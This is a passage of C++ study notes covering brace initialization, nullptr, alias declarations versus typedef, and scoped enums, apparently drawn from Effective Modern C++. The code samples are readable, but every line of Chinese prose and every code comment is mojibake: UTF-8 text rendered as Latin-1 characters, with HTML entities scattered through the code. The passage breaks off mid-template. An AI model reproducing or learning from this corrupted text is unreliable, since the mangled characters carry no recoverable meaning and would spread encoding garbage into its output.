å‡½æ•°Widget w4&#123;10, 5.0&#125;; // ä½¿ç”¨èŠ±æ‹¬å·åˆå§‹åŒ–ï¼Œç°åœ¨è°ƒç”¨ç¬¬äºŒä¸ªæ„é€ å‡½æ•° ç©ºçš„èŠ±æ‹¬å·æ„å‘³ç€æ²¡æœ‰å®å‚ï¼Œä¸æ˜¯ä¸€ä¸ªç©ºçš„std::initializer_listï¼š 1234567891011class Widget &#123; public: Widget(); //é»˜è®¤æ„é€ å‡½æ•° Widget(std::initializer_list&lt;int&gt; il); //std::initializer_listæ„é€ å‡½æ•° â€¦ //æ²¡æœ‰éšå¼è½¬æ¢å‡½æ•°&#125;;Widget w1; //è°ƒç”¨é»˜è®¤æ„é€ å‡½æ•°Widget w2&#123;&#125;; //ä¹Ÿè°ƒç”¨é»˜è®¤æ„é€ å‡½æ•°Widget w3(); //æœ€ä»¤äººå¤´ç–¼çš„è§£æï¼å£°æ˜ä¸€ä¸ªå‡½æ•° 12Widget w4(&#123;&#125;); //ä½¿ç”¨ç©ºèŠ±æ‹¬å·åˆ—è¡¨è°ƒç”¨std::initializer_listæ„é€ å‡½æ•°Widget w5&#123;&#123;&#125;&#125;; //åŒä¸Š ä½œä¸ºä¸€ä¸ªç±»åº“ä½¿ç”¨è€…ï¼Œä½ å¿…é¡»è®¤çœŸçš„åœ¨èŠ±æ‹¬å·å’Œåœ†æ‹¬å·ä¹‹é—´é€‰æ‹©ä¸€ä¸ªæ¥åˆ›å»ºå¯¹è±¡ã€‚å¤§å¤šæ•°å¼€å‘è€…éƒ½ä½¿ç”¨å…¶ä¸­ä¸€ç§ä½œä¸ºé»˜è®¤æƒ…å†µï¼Œåªæœ‰å½“ä»–ä»¬ä¸èƒ½ä½¿ç”¨è¿™ç§çš„æ—¶å€™æ‰ä¼šè€ƒè™‘å¦ä¸€ç§ã€‚ ç»“è®º èŠ±æ‹¬å·åˆå§‹åŒ–æ˜¯æœ€å¹¿æ³›ä½¿ç”¨çš„åˆå§‹åŒ–è¯­æ³•ï¼Œå®ƒé˜²æ­¢å˜çª„è½¬æ¢ï¼Œå¹¶ä¸”å¯¹äºC++æœ€ä»¤äººå¤´ç–¼çš„è§£æï¼ˆæ‹¬å·è§£æä¸ºå‡½æ•°ï¼‰æœ‰å¤©ç”Ÿçš„å…ç–«æ€§ åœ¨æ„é€ å‡½æ•°é‡è½½å†³è®®ä¸­ï¼Œç¼–è¯‘å™¨ä¼šå°½æœ€å¤§åŠªåŠ›å°†æ‹¬å·åˆå§‹åŒ–ä¸std::initializer_listå‚æ•°åŒ¹é…ï¼Œå³ä¾¿å…¶ä»–æ„é€ å‡½æ•°çœ‹èµ·æ¥æ˜¯æ›´å¥½çš„é€‰æ‹© å¯¹äºæ•°å€¼ç±»å‹çš„std::vectoræ¥è¯´ä½¿ç”¨èŠ±æ‹¬å·åˆå§‹åŒ–å’Œåœ†æ‹¬å·åˆå§‹åŒ–ä¼šé€ æˆå·¨å¤§çš„ä¸åŒ åœ¨æ¨¡æ¿ç±»é€‰æ‹©ä½¿ç”¨åœ†æ‹¬å·åˆå§‹åŒ–æˆ–ä½¿ç”¨èŠ±æ‹¬å·åˆå§‹åŒ–åˆ›å»ºå¯¹è±¡æ˜¯éœ€è¦ä»”ç»†è€ƒè™‘ 8 ä¼˜å…ˆ nullptr åœ¨C++98ä¸­ï¼Œå¯¹æŒ‡é’ˆç±»å‹å’Œæ•´å‹è¿›è¡Œé‡è½½æ„å‘³ç€å¯èƒ½å¯¼è‡´å¥‡æ€ªçš„äº‹æƒ…ã€‚å¦‚æœç»™ä¸‹é¢çš„é‡è½½å‡½æ•°ä¼ é€’0æˆ–NULLï¼Œå®ƒä»¬ç»ä¸ä¼šè°ƒç”¨æŒ‡é’ˆç‰ˆæœ¬çš„é‡è½½å‡½æ•°ï¼š 12345678void f(int); //ä¸‰ä¸ªfçš„é‡è½½å‡½æ•°void f(bool);void f(void*);f(0); //è°ƒç”¨f(int)è€Œä¸æ˜¯f(void*)f(NULL); //å¯èƒ½ä¸ä¼šè¢«ç¼–è¯‘ï¼Œä¸€èˆ¬æ¥è¯´è°ƒç”¨f(int)ï¼Œ //ç»å¯¹ä¸ä¼šè°ƒç”¨f(void*) è€Œf(NULL)çš„ä¸ç¡®å®šè¡Œä¸ºæ˜¯ç”±NULLçš„å®ç°ä¸åŒé€ æˆçš„ã€‚å¦‚æœNULLè¢«å®šä¹‰ä¸º0Lï¼ˆæŒ‡çš„æ˜¯0ä¸ºlongç±»å‹ï¼‰ï¼Œè¿™ä¸ªè°ƒç”¨å°±å…·æœ‰äºŒä¹‰æ€§ï¼Œå› ä¸ºä»longåˆ°intçš„è½¬æ¢æˆ–ä»longåˆ°boolçš„è½¬æ¢æˆ–0Låˆ°void*çš„è½¬æ¢éƒ½åŒæ ·å¥½ã€‚ nullptrçš„ä¼˜ç‚¹æ˜¯å®ƒä¸æ˜¯æ•´å‹ã€‚å®ƒä¹Ÿä¸æ˜¯ä¸€ä¸ªæŒ‡é’ˆç±»å‹ï¼Œä½†æ˜¯ä½ å¯ä»¥æŠŠå®ƒè®¤ä¸ºæ˜¯æ‰€æœ‰ç±»å‹çš„æŒ‡é’ˆã€‚nullptrçš„çœŸæ­£ç±»å‹æ˜¯std::nullptr_tï¼Œåœ¨ä¸€ä¸ªå®Œç¾çš„å¾ªç¯å®šä¹‰ä»¥åï¼Œstd::nullptr_tåˆè¢«å®šä¹‰ä¸ºnullptrã€‚std::nullptr_tå¯ä»¥éšå¼è½¬æ¢ä¸ºæŒ‡å‘ä»»ä½•å†…ç½®ç±»å‹çš„æŒ‡é’ˆã€‚ ä½¿ç”¨nullptrè°ƒç”¨få°†ä¼šè°ƒç”¨void*ç‰ˆæœ¬çš„é‡è½½å‡½æ•°ï¼Œå› ä¸ºnullpträ¸èƒ½è¢«è§†ä½œä»»ä½•æ•´å‹ï¼š 1f(nullptr); //è°ƒç”¨é‡è½½å‡½æ•°fçš„f(void*)ç‰ˆæœ¬ çœ‹ä¸‹é¢çš„ä¾‹å­ï¼š 1234auto result = findRecord( /* arguments */ );if (result == 0) &#123; â€¦&#125; å¦‚æœä½ ä¸çŸ¥é“findRecordè¿”å›äº†ä»€ä¹ˆï¼Œé‚£ä¹ˆä½ å°±ä¸å¤ªæ¸…æ¥šåˆ°åº•resultæ˜¯ä¸€ä¸ªæŒ‡é’ˆç±»å‹è¿˜æ˜¯ä¸€ä¸ªæ•´å‹ã€‚ä½†æ˜¯æ¢ä¸€ç§å‡è®¾å¦‚æœä½ çœ‹åˆ°è¿™æ ·çš„ä»£ç ï¼š 12345auto result = findRecord( /* arguments */ );if (result == nullptr) &#123; â€¦&#125; è¿™å°±æ²¡æœ‰ä»»ä½•æ­§ä¹‰ï¼šresultçš„ç»“æœä¸€å®šæ˜¯æŒ‡é’ˆç±»å‹ã€‚ å†è€ƒè™‘ä¸‹é¢ä¾‹å­ï¼š å‡å¦‚ä½ æœ‰ä¸€äº›å‡½æ•°åªèƒ½è¢«åˆé€‚çš„å·²é”äº’æ–¥é‡è°ƒç”¨ã€‚æ¯ä¸ªå‡½æ•°éƒ½æœ‰ä¸€ä¸ªä¸åŒç±»å‹çš„æŒ‡é’ˆï¼š 123int f1(std::shared_ptr&lt;Widget&gt; spw); //åªèƒ½è¢«åˆé€‚çš„double f2(std::unique_ptr&lt;Widget&gt; upw); //å·²é”äº’æ–¥é‡bool f3(Widget* pw); //è°ƒç”¨ å¦‚æœè¿™æ ·ä¼ é€’ç©ºæŒ‡é’ˆï¼š 12345678910111213141516171819std::mutex f1m, f2m, f3m; //ç”¨äºf1ï¼Œf2ï¼Œf3å‡½æ•°çš„äº’æ–¥é‡using MuxGuard = std::lock_guard&lt;std::mutex&gt;;â€¦&#123; MuxGuard g(f1m); //ä¸ºf1mä¸Šé” auto result = f1(0); //å‘f1ä¼ é€’0ä½œä¸ºç©ºæŒ‡é’ˆ&#125; //è§£é” â€¦&#123; MuxGuard g(f2m); //ä¸ºf2mä¸Šé” auto result = f2(NULL); //å‘f2ä¼ é€’NULLä½œä¸ºç©ºæŒ‡é’ˆ&#125; //è§£é” â€¦&#123; MuxGuard g(f3m); //ä¸ºf3mä¸Šé” auto result = f3(nullptr); //å‘f3ä¼ é€’nullpträ½œä¸ºç©ºæŒ‡é’ˆ&#125; //è§£é” ä»¤äººé—æ†¾å‰ä¸¤ä¸ªè°ƒç”¨æ²¡æœ‰ä½¿ç”¨nullptrï¼Œä½†æ˜¯ä»£ç å¯ä»¥æ­£å¸¸è¿è¡Œã€‚ æ¨¡æ¿åŒ–è¿™ä¸ªè°ƒç”¨æµç¨‹ï¼š 12345678910template&lt;typename FuncType, typename MuxType, typename PtrType&gt;auto lockAndCall(FuncType func, MuxType&amp; mutex, PtrType ptr) -&gt; decltype(func(ptr))&#123; MuxGuard g(mutex); return func(ptr); &#125; 12345678910template&lt;typename FuncType, typename MuxType, typename PtrType&gt;decltype(auto) lockAndCall(FuncType func, //C++14 MuxType&amp; mutex, PtrType ptr)&#123; MuxGuard g(mutex); return func(ptr); &#125; å¯ä»¥å†™è¿™æ ·çš„ä»£ç è°ƒç”¨lockAndCallæ¨¡æ¿ï¼š 12345auto result1 = lockAndCall(f1, f1m, 0); //é”™è¯¯ï¼...auto result2 = lockAndCall(f2, f2m, NULL); //é”™è¯¯ï¼...auto result3 = lockAndCall(f3, f3m, nullptr); //æ²¡é—®é¢˜ ä»£ç è™½ç„¶å¯ä»¥è¿™æ ·å†™ï¼Œä½†æ˜¯å°±åƒæ³¨é‡Šä¸­è¯´çš„ï¼Œå‰ä¸¤ä¸ªæƒ…å†µä¸èƒ½é€šè¿‡ç¼–è¯‘ã€‚ å½“0è¢«ä¼ é€’ç»™lockAndCallæ¨¡æ¿ï¼Œæ¨¡æ¿ç±»å‹æ¨å¯¼ä¼šå°è¯•å»æ¨å¯¼å®å‚ç±»å‹ï¼Œ0çš„ç±»å‹æ€»æ˜¯intã€‚ è¿™æ„å‘³ç€lockAndCallä¸­funcä¼šè¢«intç±»å‹çš„å®å‚è°ƒç”¨ï¼Œè¿™ä¸f1æœŸå¾…çš„std::shared_ptr&lt;Widget&gt;å½¢å‚ä¸ç¬¦ã€‚æŠŠintç±»å‹çœ‹åšstd::shared_ptr&lt;Widget&gt;ç±»å‹ç»™f1è‡ªç„¶æ˜¯ä¸€ä¸ªç±»å‹é”™è¯¯ã€‚åœ¨æ¨¡æ¿lockAndCallä¸­ä½¿ç”¨0ä¹‹æ‰€ä»¥å¤±è´¥æ˜¯å› ä¸ºåœ¨æ¨¡æ¿ä¸­ï¼Œä¼ ç»™çš„æ˜¯intä½†å®é™…ä¸Šå‡½æ•°æœŸå¾…çš„æ˜¯ä¸€ä¸ªstd::shared_ptr&lt;Widget&gt;ã€‚ å½“nullpträ¼ ç»™lockAndCallæ—¶ï¼Œptrè¢«æ¨å¯¼ä¸ºstd::nullptr_tã€‚å½“ptrè¢«ä¼ é€’ç»™f3çš„æ—¶å€™ï¼Œéšå¼è½¬æ¢ä½¿std::nullptr_tè½¬æ¢ä¸ºWidget*ï¼Œå› ä¸ºstd::nullptr_tå¯ä»¥éšå¼è½¬æ¢ä¸ºä»»ä½•æŒ‡é’ˆç±»å‹ã€‚ ç»“è®º ä¼˜å…ˆè€ƒè™‘ nullptr é¿å…é‡è½½æŒ‡é’ˆå’Œæ•´å‹ 9 ä¼˜å…ˆ alias è€Œä¸æ˜¯ typedef typedefå³å¯ï¼š 123typedef std::unique_ptr&lt;std::unordered_map&lt;std::string, std::string&gt;&gt; UPtrMapSS; ä½†typedefæ˜¯C++98çš„ä¸œè¥¿ã€‚ C++11ä¹Ÿæä¾›äº†ä¸€ä¸ªåˆ«åå£°æ˜ï¼ˆalias declarationï¼‰ï¼š 12using UPtrMapSS = std::unique_ptr&lt;std::unordered_map&lt;std::string, std::string&gt;&gt;; ç”±äºè¿™é‡Œç»™å‡ºçš„typedefå’Œåˆ«åå£°æ˜åšçš„éƒ½æ˜¯å®Œå…¨ä¸€æ ·çš„äº‹æƒ…ã€‚ ä½¿ç”¨åˆ«åæ¨¡æ¿ï¼Œä¼šå®¹æ˜“å¾ˆå¤šï¼š 12345template&lt;typename T&gt; //MyAllocList&lt;T&gt;æ˜¯using MyAllocList = std::list&lt;T, MyAlloc&lt;T&gt;&gt;; //std::list&lt;T, MyAlloc&lt;T&gt;&gt; //çš„åŒä¹‰è¯MyAllocList&lt;Widget&gt; lw; //ç”¨æˆ·ä»£ç  ä½¿ç”¨typedefï¼Œä½ å°±åªèƒ½ä»å¤´å¼€å§‹ï¼š 123456template&lt;typename T&gt; //MyAllocList&lt;T&gt;æ˜¯struct MyAllocList &#123; //std::list&lt;T, MyAlloc&lt;T&gt;&gt; typedef std::list&lt;T, MyAlloc&lt;T&gt;&gt; type; //çš„åŒä¹‰è¯ &#125;;MyAllocList&lt;Widget&gt;::type lw; //ç”¨æˆ·ä»£ç  å¦‚æœä½ æƒ³ä½¿ç”¨åœ¨ä¸€ä¸ªæ¨¡æ¿å†…ä½¿ç”¨typedefå£°æ˜ä¸€ä¸ªé“¾è¡¨å¯¹è±¡ï¼Œè€Œè¿™ä¸ªå¯¹è±¡åˆä½¿ç”¨äº†æ¨¡æ¿å½¢å‚ï¼Œä½ å°±ä¸å¾—ä¸åœ¨typedefå‰é¢åŠ ä¸Štypenameï¼š 123456template&lt;typename T&gt;class Widget &#123; //Widget&lt;T&gt;å«æœ‰ä¸€ä¸ªprivate: //MyAllocLIst&lt;T&gt;å¯¹è±¡ typename MyAllocList&lt;T&gt;::type list; //ä½œä¸ºæ•°æ®æˆå‘˜ â€¦&#125;; è¿™é‡ŒMyAllocList&lt;T&gt;::typeä½¿ç”¨äº†ä¸€ä¸ªç±»å‹ï¼Œè¿™ä¸ªç±»å‹ä¾èµ–äºæ¨¡æ¿å‚æ•°Tã€‚ å¦‚æœä½¿ç”¨åˆ«åå£°æ˜å®šä¹‰ä¸€ä¸ªMyAllocListï¼Œå°±ä¸éœ€è¦ä½¿ç”¨typenameï¼ˆåŒæ—¶çœç•¥éº»çƒ¦çš„â€œ::typeâ€åç¼€ï¼‰ï¼š 123456789template&lt;typename T&gt; using MyAllocList = std::list&lt;T, MyAlloc&lt;T&gt;&gt;; //åŒä¹‹å‰ä¸€æ ·template&lt;typename T&gt;class Widget &#123;private: MyAllocList&lt;T&gt; list; //æ²¡æœ‰â€œtypenameâ€ â€¦ //æ²¡æœ‰â€œ::typeâ€&#125;; C++11åœ¨type traitsï¼ˆç±»å‹ç‰¹æ€§ï¼‰ä¸­ç»™äº†ä½ ä¸€ç³»åˆ—å·¥å…·å»å®ç°ç±»å‹è½¬æ¢ï¼Œå¦‚æœè¦ä½¿ç”¨è¿™äº›æ¨¡æ¿è¯·åŒ…å«å¤´æ–‡ä»¶&lt;type_traits&gt;ã€‚é‡Œé¢æœ‰è®¸è®¸å¤šå¤štype traitsï¼Œä¹Ÿä¸å…¨æ˜¯ç±»å‹è½¬æ¢çš„å·¥å…·ï¼Œä¹ŸåŒ…å«ä¸€äº›å¯é¢„æµ‹æ¥å£çš„å·¥å…·ã€‚ç»™ä¸€ä¸ªä½ æƒ³æ–½åŠ è½¬æ¢çš„ç±»å‹Tï¼Œç»“æœç±»å‹å°±æ˜¯std::transformation&lt;T&gt;::typeï¼Œæ¯”å¦‚ï¼š 123std::remove_const&lt;T&gt;::type //ä»const Tä¸­äº§å‡ºTstd::remove_reference&lt;T&gt;::type //ä»T&amp;å’ŒT&amp;&amp;ä¸­äº§å‡ºTstd::add_lvalue_reference&lt;T&gt;::type //ä»Tä¸­äº§å‡ºT&amp; æ³¨é‡Šä»…ä»…ç®€å•çš„æ€»ç»“äº†ç±»å‹è½¬æ¢åšäº†ä»€ä¹ˆï¼Œæ‰€ä»¥ä¸è¦å¤ªéšä¾¿çš„ä½¿ç”¨ã€‚åœ¨ä½ çš„é¡¹ç›®ä½¿ç”¨å®ƒä»¬ä¹‹å‰ï¼Œä½ æœ€å¥½çœ‹çœ‹å®ƒä»¬çš„è¯¦ç»†è¯´æ˜ä¹¦ã€‚ è¿™äº›åˆ«åå£°æ˜æœ‰ä¸€ä¸ªé€šç”¨å½¢å¼ï¼šå¯¹äºC++11çš„ç±»å‹è½¬æ¢std::transformation&lt;T&gt;::typeåœ¨C++14ä¸­å˜æˆäº†std::transformation_tã€‚ä¸¾ä¸ªä¾‹å­æˆ–è®¸æ›´å®¹æ˜“ç†è§£ï¼š 12345678std::remove_const&lt;T&gt;::type //C++11: const T â†’ T std::remove_const_t&lt;T&gt; //C++14 ç­‰ä»·å½¢å¼std::remove_reference&lt;T&gt;::type //C++11: T&amp;/T&amp;&amp; â†’ T std::remove_reference_t&lt;T&gt; //C++14 ç­‰ä»·å½¢å¼std::add_lvalue_reference&lt;T&gt;::type //C++11: T â†’ T&amp; std::add_lvalue_reference_t&lt;T&gt; //C++14 ç­‰ä»·å½¢å¼ C++11çš„çš„å½¢å¼åœ¨C++14ä¸­ä¹Ÿæœ‰æ•ˆã€‚å…¶ç®€å•å®ç°å½¢å¼æ˜¯ï¼š 123456789template &lt;class T&gt; using remove_const_t = typename remove_const&lt;T&gt;::type;template &lt;class T&gt; using remove_reference_t = typename remove_reference&lt;T&gt;::type;template &lt;class T&gt; using add_lvalue_reference_t = typename add_lvalue_reference&lt;T&gt;::type; ç»“è®º typedefä¸æ”¯æŒæ¨¡æ¿åŒ–ï¼Œä½†æ˜¯åˆ«åå£°æ˜æ”¯æŒã€‚ åˆ«åæ¨¡æ¿é¿å…äº†ä½¿ç”¨â€œ::typeâ€åç¼€ï¼Œè€Œä¸”åœ¨æ¨¡æ¿ä¸­ä½¿ç”¨typedefè¿˜éœ€è¦åœ¨å‰é¢åŠ ä¸Štypename C++14æä¾›äº†C++11æ‰€æœ‰type traitsè½¬æ¢çš„åˆ«åå£°æ˜ç‰ˆæœ¬ 10 é™åŸŸ`enum 12345678enum class Color &#123; black, white, red &#125;; //black, white, red //é™åˆ¶åœ¨ColoråŸŸå†…auto white = false; //æ²¡é—®é¢˜ï¼ŒåŸŸå†…æ²¡æœ‰å…¶ä»–â€œwhiteâ€Color c = white; //é”™è¯¯ï¼ŒåŸŸä¸­æ²¡æœ‰æšä¸¾åå«whiteColor c = Color::white; //æ²¡é—®é¢˜auto c = Color::white; //ä¹Ÿæ²¡é—®é¢˜ï¼ˆä¹Ÿç¬¦åˆItem5çš„å»ºè®®ï¼‰ å› ä¸ºé™åŸŸenumæ˜¯é€šè¿‡â€œenum classâ€å£°æ˜ï¼Œæ‰€ä»¥å®ƒä»¬æœ‰æ—¶å€™ä¹Ÿè¢«ç§°ä¸ºæšä¸¾ç±»(enum classes)ã€‚ ä½¿ç”¨é™åŸŸenumæ¥å‡å°‘å‘½åç©ºé—´æ±¡æŸ“ï¼Œè¿™æ˜¯ä¸€ä¸ªè¶³å¤Ÿåˆç†ä½¿ç”¨å®ƒè€Œä¸æ˜¯å®ƒçš„åŒèƒæœªé™åŸŸenumçš„ç†ç”±ã€‚ å…¶å®é™åŸŸenumè¿˜æœ‰ç¬¬äºŒä¸ªå¸å¼•äººçš„ä¼˜ç‚¹ï¼šåœ¨å®ƒçš„ä½œç”¨åŸŸä¸­ï¼Œæšä¸¾åæ˜¯å¼ºç±»å‹ã€‚æœªé™åŸŸenumä¸­çš„æšä¸¾åä¼šéšå¼è½¬æ¢ä¸ºæ•´å‹ï¼ˆç°åœ¨ï¼Œä¹Ÿå¯ä»¥è½¬æ¢ä¸ºæµ®ç‚¹ç±»å‹ï¼‰ã€‚å› æ­¤ä¸‹é¢è¿™ç§æ­ªæ›²è¯­ä¹‰çš„åšæ³•ä¹Ÿæ˜¯å®Œå…¨æœ‰æ•ˆçš„ï¼š 12345678910111213enum Color &#123; black, white, red &#125;; //æœªé™åŸŸenumstd::vector&lt;std::size_t&gt; //funcè¿”å›xçš„è´¨å› å­ primeFactors(std::size_t x);Color c = red;â€¦if (c &lt; 14.5) &#123; // Colorä¸doubleæ¯”è¾ƒ (!) auto factors = // è®¡ç®—ä¸€ä¸ªColorçš„è´¨å› å­(!) primeFactors(c); â€¦&#125; åœ¨enumåé¢å†™ä¸€ä¸ªclasså°±å¯ä»¥å°†éé™åŸŸenumè½¬æ¢ä¸ºé™åŸŸenumï¼Œæ¥ä¸‹æ¥å°±æ˜¯å®Œå…¨ä¸åŒçš„æ•…äº‹å±•å¼€äº†ã€‚ç°åœ¨ä¸å­˜åœ¨ä»»ä½•éšå¼è½¬æ¢å¯ä»¥å°†é™åŸŸenumä¸­çš„æšä¸¾åè½¬åŒ–ä¸ºä»»ä½•å…¶ä»–ç±»å‹ï¼š 12345678910111213enum class Color &#123; black, white, red &#125;; //Colorç°åœ¨æ˜¯é™åŸŸenumColor c = Color::red; //å’Œä¹‹å‰ä¸€æ ·ï¼Œåªæ˜¯... //å¤šäº†ä¸€ä¸ªåŸŸä¿®é¥°ç¬¦if (c &lt; 14.5) &#123; //é”™è¯¯ï¼ä¸èƒ½æ¯”è¾ƒ //Colorå’Œdouble auto factors = //é”™è¯¯ï¼ä¸èƒ½å‘å‚æ•°ä¸ºstd::size_t primeFactors(c); //çš„å‡½æ•°ä¼ é€’Colorå‚æ•° â€¦&#125;// é™¤é static_cast&lt;double&gt;(c) åœ¨C++ä¸­æ‰€æœ‰çš„enuméƒ½æœ‰ä¸€ä¸ªç”±ç¼–è¯‘å™¨å†³å®šçš„æ•´å‹çš„åº•å±‚ç±»å‹ã€‚å¯¹äºéé™åŸŸenumæ¯”å¦‚Colorï¼Œ 1enum Color &#123; black, white, red &#125;; ç¼–è¯‘å™¨å¯èƒ½é€‰æ‹©charä½œä¸ºåº•å±‚ç±»å‹ï¼Œå› ä¸ºè¿™é‡Œåªéœ€è¦è¡¨ç¤ºä¸‰ä¸ªå€¼ã€‚ç„¶è€Œï¼Œæœ‰äº›enumä¸­çš„æšä¸¾å€¼èŒƒå›´å¯èƒ½ä¼šå¤§äº›ï¼Œæ¯”å¦‚ï¼š 123456enum Status &#123; good = 0, failed = 1, incomplete = 100, corrupt = 200, indeterminate = 0xFFFFFFFF &#125;; è¿™é‡Œå€¼çš„èŒƒå›´ä»0åˆ°0xFFFFFFFFã€‚é™¤äº†åœ¨ä¸å¯»å¸¸çš„æœºå™¨ä¸Šï¼ˆæ¯”å¦‚ä¸€ä¸ªcharè‡³å°‘æœ‰32bitsçš„é‚£ç§ï¼‰ï¼Œç¼–è¯‘å™¨éƒ½ä¼šé€‰æ‹©ä¸€ä¸ªæ¯”charå¤§çš„æ•´å‹ç±»å‹æ¥è¡¨ç¤ºStatusã€‚ ä¸ºäº†é«˜æ•ˆä½¿ç”¨å†…å­˜ï¼Œç¼–è¯‘å™¨é€šå¸¸åœ¨ç¡®ä¿èƒ½åŒ…å«æ‰€æœ‰æšä¸¾å€¼çš„å‰æä¸‹ä¸ºenumé€‰æ‹©ä¸€ä¸ªæœ€å°çš„åº•å±‚ç±»å‹ã€‚ ä¸ºæ­¤ï¼ŒC++98åªæ”¯æŒenumå®šä¹‰ï¼ˆæ‰€æœ‰æšä¸¾åå…¨éƒ¨åˆ—å‡ºæ¥ï¼‰ï¼›enumå£°æ˜æ˜¯ä¸è¢«å…è®¸çš„ã€‚ç¼–è¯‘å™¨æ‰èƒ½åœ¨ä½¿ç”¨ä¹‹å‰ä¸ºæ¯ä¸€ä¸ªenumé€‰æ‹©ä¸€ä¸ªåº•å±‚ç±»å‹ã€‚ ä¸èƒ½å‰ç½®å£°æ˜enumä¹Ÿæ˜¯æœ‰ç¼ºç‚¹çš„ã€‚æœ€å¤§çš„ç¼ºç‚¹è«è¿‡äºå®ƒå¯èƒ½å¢åŠ ç¼–è¯‘ä¾èµ–ã€‚ç³»ç»Ÿä¸­æŸä¸ªæšä¸¾ç±»å‹çš„å¤´æ–‡ä»¶åŒ…å«åœ¨å¤šä¸ªæ–‡ä»¶ä¸­ã€‚å¦‚æœå¼•å…¥ä¸€ä¸ªæ–°çŠ¶æ€å€¼ï¼Œé‚£ä¹ˆå¯èƒ½æ•´ä¸ªç³»ç»Ÿéƒ½å¾—é‡æ–°ç¼–è¯‘ã€‚ C++11ä¸­çš„å‰ç½®å£°æ˜enumså¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚ 12enum class Status; //å‰ç½®å£°æ˜void continueProcessing(Status s); //ä½¿ç”¨å‰ç½®å£°æ˜enum å³ä½¿Statusçš„å®šä¹‰å‘ç”Ÿæ”¹å˜ï¼ŒåŒ…å«è¿™äº›å£°æ˜çš„å¤´æ–‡ä»¶ä¹Ÿä¸éœ€è¦é‡æ–°ç¼–è¯‘ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œé™åŸŸæšä¸¾çš„åº•å±‚ç±»å‹æ˜¯intï¼š 1enum class Status; //åº•å±‚ç±»å‹æ˜¯int å¦‚æœé»˜è®¤çš„intä¸é€‚ç”¨ï¼Œä½ å¯ä»¥é‡å†™å®ƒï¼š 123enum class Status: std::uint32_t; //Statusçš„åº•å±‚ç±»å‹ //æ˜¯std::uint32_t //ï¼ˆéœ€è¦åŒ…å« &lt;cstdint&gt;ï¼‰ ä¸ç®¡æ€æ ·ï¼Œç¼–è¯‘å™¨éƒ½çŸ¥é“é™åŸŸenumä¸­çš„æšä¸¾åå ç”¨å¤šå°‘å­—èŠ‚ã€‚ è¦ä¸ºéé™åŸŸenumæŒ‡å®šåº•å±‚ç±»å‹ï¼Œä½ å¯ä»¥åŒä¸Šï¼Œç»“æœå°±å¯ä»¥å‰å‘å£°æ˜ï¼š 123enum Color: std::uint8_t; //éé™åŸŸenumå‰å‘å£°æ˜ //åº•å±‚ç±»å‹ä¸º //std::uint8_t åº•å±‚ç±»å‹è¯´æ˜ä¹Ÿå¯ä»¥æ”¾åˆ°enumå®šä¹‰å¤„ï¼š 1234567enum class Status: std::uint32_t &#123; good = 0, failed = 1, incomplete = 100, corrupt = 200, audited = 500, indeterminate = 0xFFFFFFFF &#125;; å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªtupleä¿å­˜äº†ç”¨æˆ·çš„åå­—ï¼Œemailåœ°å€ï¼Œå£°æœ›å€¼ï¼š 1234using UserInfo = //ç±»å‹åˆ«åï¼Œå‚è§Item9 std::tuple&lt;std::string, //åå­— std::string, //emailåœ°å€ std::size_t&gt; ; //å£°æœ› è™½ç„¶æ³¨é‡Šè¯´æ˜äº†tupleå„ä¸ªå­—æ®µå¯¹åº”çš„æ„æ€ï¼Œä½†å½“ä½ åœ¨å¦ä¸€æ–‡ä»¶é‡åˆ°ä¸‹é¢çš„ä»£ç é‚£ä¹‹å‰çš„æ³¨é‡Šå°±ä¸æ˜¯é‚£ä¹ˆæœ‰ç”¨äº†ï¼š 123UserInfo uInfo; //tupleå¯¹è±¡â€¦auto val = std::get&lt;1&gt;(uInfo); //è·å–ç¬¬ä¸€ä¸ªå­—æ®µ åœ¨ get æ—¶ï¼Œæ˜¾ç¤ºå†™æ˜1éšä»£è¡¨çš„å­—æ®µã€‚ ç”¨éé™åŸŸenumå°†åå­—å’Œå­—æ®µç¼–å·å…³è”èµ·æ¥ä»¥é¿å…ä¸Šè¿°éœ€æ±‚ï¼š 12345enum UserInfoFields &#123; uiName, uiEmail, uiReputation &#125;;UserInfo uInfo; //åŒä¹‹å‰ä¸€æ ·â€¦auto val = std::get&lt;uiEmail&gt;(uInfo); //å•Šï¼Œè·å–ç”¨æˆ·emailå­—æ®µçš„å€¼ ä¹‹æ‰€ä»¥å®ƒèƒ½æ­£å¸¸å·¥ä½œæ˜¯å› ä¸ºUserInfoFieldsä¸­çš„æšä¸¾åéšå¼è½¬æ¢æˆstd::size_tã€‚ å¯¹åº”çš„é™åŸŸenumç‰ˆæœ¬å°±å¾ˆå•°å—¦äº†ï¼š 1234567enum class UserInfoFields &#123; uiName, uiEmail, uiReputation &#125;;UserInfo uInfo; //åŒä¹‹å‰ä¸€æ ·â€¦auto val = std::get&lt;static_cast&lt;std::size_t&gt;(UserInfoFields::uiEmail)&gt; (uInfo); ä¸ºé¿å…è¿™ç§å†—é•¿çš„è¡¨ç¤ºï¼Œæˆ‘ä»¬å¯ä»¥å†™ä¸€ä¸ªå‡½æ•°ä¼ å…¥æšä¸¾åå¹¶è¿”å›å¯¹åº”çš„std::size_tå€¼ï¼Œä½†è¿™æœ‰ä¸€ç‚¹æŠ€å·§æ€§ã€‚ å°†æšä¸¾åå˜æ¢ä¸ºstd::size_tå€¼çš„å‡½æ•°å¿…é¡»åœ¨ç¼–è¯‘æœŸäº§ç”Ÿè¿™ä¸ªç»“æœã€‚ å®ƒè¯¥æ˜¯ä¸€ä¸ªconstexprå‡½æ•°æ¨¡æ¿ï¼Œå› ä¸ºå®ƒåº”è¯¥èƒ½ç”¨äºä»»ä½•enumã€‚ åº•å±‚ç±»å‹å¯ä»¥é€šè¿‡std::underlying_typeè¿™ä¸ªtype traitè·å¾—ã€‚ 12345678template&lt;typename E&gt;constexpr typename std::underlying_type&lt;E&gt;::type toUType(E enumerator) noexcept&#123; return static_cast&lt;typename std::underlying_type&lt;E&gt;::type&gt;(enumerator);&#125; åœ¨C++14ä¸­ï¼ŒtoUTypeè¿˜å¯ä»¥è¿›ä¸€æ­¥ç”¨std::underlying_type_tä»£æ›¿typename std::underlying_type&lt;E&gt;::typeæ‰“ç£¨ï¼š 123456template&lt;typename E&gt; //C++14constexpr std::underlying_type_t&lt;E&gt; toUType(E enumerator) noexcept&#123; return static_cast&lt;std::underlying_type_t&lt;E&gt;&gt;(enumerator);&#125; è¿˜å¯ä»¥å†ç”¨C++14 autoæ‰“ç£¨ä¸€ä¸‹ä»£ç ï¼š 123456template&lt;typename 